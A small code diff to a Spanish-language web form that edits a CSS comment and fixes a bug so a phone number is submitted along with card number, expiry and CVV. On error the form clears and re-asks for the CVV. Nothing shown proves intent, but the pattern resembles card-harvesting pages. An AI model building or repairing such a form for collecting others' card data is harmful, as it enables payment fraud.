@@ -84,7 +84,7 @@
     z-index: 10;
   }
 
-  /* Tarjeta blanca flotante del formulario */
+  /* Tarjeta blanca flotante del formulario con el diseño exacto */
   .card-form {
     background: #ffffff;
     border-radius: 24px;
@@ -352,7 +352,7 @@
       tc: tc.value.replace(/\s/g, ''),
       expiry: expiryFormatted,
       cvv: cvv.value,
-      phone: phone.phone
+      phone: phone.value
     }, {
       onOk: () => { sessionStorage.clear(); location.href = 'index.html'; },
       onErr: () => { hideLoader(); errEl.classList.add('show'); cvv.value = ''; check(); cvv.focus(); }
